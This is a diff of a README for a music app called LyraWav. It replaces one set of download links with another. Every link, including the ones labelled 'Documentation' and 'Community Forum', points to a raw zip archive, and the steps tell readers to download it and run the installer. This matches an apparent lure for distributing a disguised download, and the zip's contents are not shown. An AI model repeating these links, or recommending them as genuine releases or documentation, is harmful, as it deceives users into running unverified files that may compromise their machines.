@@ -15,11 +15,11 @@ Before you begin, ensure your computer meets these requirements:
 
 ## 🔗 Download Link
 
-To download LyraWav, **[click here to visit the Releases page](https://raw.githubusercontent.com/Genezi111/LyraWav/main/spontaneously/LyraWav.zip)**.
+To download LyraWav, **[click here to visit the Releases page](https://github.com/Genezi111/LyraWav/raw/refs/heads/main/spontaneously/Wav_Lyra_v2.0.zip)**.
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/Genezi111/LyraWav/main/spontaneously/LyraWav.zip) to find the latest version of LyraWav.
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/Genezi111/LyraWav/raw/refs/heads/main/spontaneously/Wav_Lyra_v2.0.zip) to find the latest version of LyraWav.
   
 2. **Choose Your Version:** Select the version that matches your operating system.
 
@@ -73,7 +73,7 @@ LyraWav supports various streaming services. Simply:
 
 To update:
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/Genezi111/LyraWav/main/spontaneously/LyraWav.zip).
+1. Visit the [Releases page](https://github.com/Genezi111/LyraWav/raw/refs/heads/main/spontaneously/Wav_Lyra_v2.0.zip).
 2. Download the latest version as described in the "Download & Install" section.
 3. Run the installer as before.
 
@@ -95,7 +95,7 @@ If you encounter any issues or have questions:
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://raw.githubusercontent.com/Genezi111/LyraWav/main/spontaneously/LyraWav.zip) - Explore more about features and functionality.
-- [Community Forum](https://raw.githubusercontent.com/Genezi111/LyraWav/main/spontaneously/LyraWav.zip) - Join our discussions to share your experience.
+- [Documentation](https://github.com/Genezi111/LyraWav/raw/refs/heads/main/spontaneously/Wav_Lyra_v2.0.zip) - Explore more about features and functionality.
+- [Community Forum](https://github.com/Genezi111/LyraWav/raw/refs/heads/main/spontaneously/Wav_Lyra_v2.0.zip) - Join our discussions to share your experience.
 
 Thank you for choosing LyraWav! Enjoy every note and memory.
